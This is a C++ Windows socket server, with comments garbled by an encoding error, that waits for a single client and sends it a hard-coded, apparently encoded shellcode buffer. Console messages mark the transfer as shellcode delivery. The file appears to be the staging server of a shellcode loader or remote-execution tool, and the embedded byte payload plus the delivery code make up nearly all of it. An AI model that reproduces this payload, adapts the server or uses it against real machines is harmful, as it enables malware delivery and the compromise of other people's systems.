#include <WinSock2.h>
#include <iostream>
#pragma comment(lib, "ws2_32.lib")

using namespace std;


int main(int argc, char* argv[])
{
	const int BUF_SIZE = 1024;
	WSADATA         wsd;            //WSADATA����
	SOCKET          sServer;        //�������׽���
	SOCKET          sClient;        //�ͻ����׽���
	SOCKADDR_IN     addrServ;;      //��������ַ
	char            buf[BUF_SIZE];  //�������ݻ�����
	char			sendBuf[] = "\xf6\xe2\x88\x0a\x0a\x0a\x6a\x83\xef\x3b\xca\x6e\x81\x5a\x3a\x81\x58\x06\x81\x58\x1e\x81\x78\x22\x05\xbd\x40\x2c\x3b\xf5\xa6\x36\x6b\x76\x08\x26\x2a\xcb\xc5\x07\x0b\xcd\xe8\xf8\x58\x5d\x81\x58\x1a\x81\x40\x36\x81\x46\x1b\x72\xe9\x42\x0b\xdb\x5b\x81\x53\x2a\x0b\xd9\x81\x43\x12\xe9\x30\x43\x81\x3e\x81\x0b\xdc\x3b\xf5\xa6\xcb\xc5\x07\x0b\xcd\x32\xea\x7f\xfc\x09\x77\xf2\x31\x77\x2e\x7f\xee\x52\x81\x52\x2e\x0b\xd9\x6c\x81\x06\x41\x81\x52\x16\x0b\xd9\x81\x0e\x81\x0b\xda\x83\x4e\x2e\x2e\x51\x51\x6b\x53\x50\x5b\xf5\xea\x55\x55\x50\x81\x18\xe1\x87\x57\x62\x39\x38\x0a\x0a\x62\x7d\x79\x38\x55\x5e\x62\x46\x7d\x2c\x0d\x83\xe2\xf5\xda\xb2\x9a\x0b\x0a\x0a\x23\xce\x5e\x5a\x62\x23\x8a\x61\x0a\xf5\xdf\x60\x00\x62\x72\x45\x48\x30\x62\x08\x0a\x14\x6b\x83\xec\x5a\x5a\x5a\x5a\x4a\x5a\x4a\x5a\x62\xe0\x05\xd5\xea\xf5\xdf\x9d\x60\x1a\x5c\x5d\x62\x93\xaf\x7e\x6b\xf5\xdf\x8f\xca\x7e\x00\xf5\x44\x02\x7f\xe6\xe2\x6d\x0a\x0a\x0a\x60\x0a\x60\x0e\x5c\x5d\x62\x08\xd3\xc2\x55\xf5\xdf\x89\xf2\x0a\x74\x3c\x81\x3c\x60\x4a\x62\x0a\x1a\x0a\x0a\x5c\x60\x0a\x62\x52\xae\x59\xef\xf5\xdf\x99\x59\x60\x0a\x5c\x59\x5d\x62\x08\xd3\xc2\x55\xf5\xdf\x89\xf2\x0a\x77\x22\x52\x62\x0a\x4a\x0a\x0a\x60\x0a\x5a\x62\x01\x25\x05\x3a\xf5\xdf\x5d\x62\x7f\x64\x47\x6b\xf5\xdf\x54\x54\xf5\x06\x2e\x05\x8f\x7a\xf5\xf5\xf5\xe3\x91\xf5\xf5\xf5\x0b\xc9\x23\xcc\x7f\xcb\xc9\xb1\xfa\xbf\xa8\x5c\x60\x0a\x59\xf5\xdf";
	int             retVal;         //����ֵ

	if (argc <= 1){
		cout << "USAGE: server.exe <Listen Port>" << endl;
		return -1;
	}

	if (WSAStartup(MAKEWORD(2, 2), &wsd) != 0)//��ʼ���׽��ֶ�̬��
	{
		cout << "WSAStartup failed!" << endl;
		return 1;
	}

	//�����׽���
	sServer = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (INVALID_SOCKET == sServer)
	{
		cout << "Socket Failed!" << endl;
		WSACleanup();//�ͷ��׽�����Դ;
		return  -1;
	}

	//�������׽��ֵ�ַ
	addrServ.sin_family = AF_INET;
	addrServ.sin_port = htons((short)atoi(argv[1]));;
	addrServ.sin_addr.s_addr = htonl(INADDR_ANY);

	//���׽���
	retVal = bind(sServer, (LPSOCKADDR)&addrServ, sizeof(SOCKADDR_IN));
	if (SOCKET_ERROR == retVal)
	{
		cout << "Bind Failed!" << endl;
		closesocket(sServer);   //�ر��׽���
		WSACleanup();           //�ͷ��׽�����Դ;
		return -1;
	}

	//��ʼ���� 
	retVal = listen(sServer, 1);
	if (SOCKET_ERROR == retVal)
	{
		cout << "Listen Failed!" << endl;
		closesocket(sServer);   //�ر��׽���
		WSACleanup();           //�ͷ��׽�����Դ;
		return -1;
	}
	cout << "��ʼ������...." << endl;

	//���ܿͻ�������
	sockaddr_in addrClient;
	int addrClientlen = sizeof(addrClient);
	sClient = accept(sServer, (sockaddr FAR*)&addrClient, &addrClientlen); // ���ɶ�Ӧ��ǰ�ͻ������ӵ��׽���sClient
	if (INVALID_SOCKET == sClient)
	{
		cout << "Accept Failed!" << endl;
		closesocket(sServer);   //�ر��׽���
		WSACleanup();           //�ͷ��׽�����Դ;
		return -1;
	}

	int flag = 1; //ֻ����һ��
	while (flag)
	{
		//���տͻ�������
		ZeroMemory(buf, BUF_SIZE); // ���Ϊ0 ��ֹ�ڴ���䷢������

		retVal = recv(sClient, buf, BUF_SIZE, 0); // �������ݷ���buf������

		if (SOCKET_ERROR == retVal) //�ж��Ƿ���մ���
		{
			cout << "Recv Failed!" << endl;
			closesocket(sServer);   //�ر��׽���
			closesocket(sClient);   //�ر��׽���     
			WSACleanup();           //�ͷ��׽�����Դ;
			return -1;
		}
		if (buf[0] == '0')
			break;

		cout << "�ɹ�����ͨ��" << endl;
		send(sClient, sendBuf, sizeof(sendBuf), 0);
		cout << "��ͻ��˷���shellcode..." << endl;
		cout << "����shellcode�ɹ�!" << endl;
		flag = 0;

	}
	//�˳�
	closesocket(sServer);   //�ر��׽���
	closesocket(sClient);   //�ر��׽���
	WSACleanup();           //�ͷ��׽�����Դ;

	return 0;
}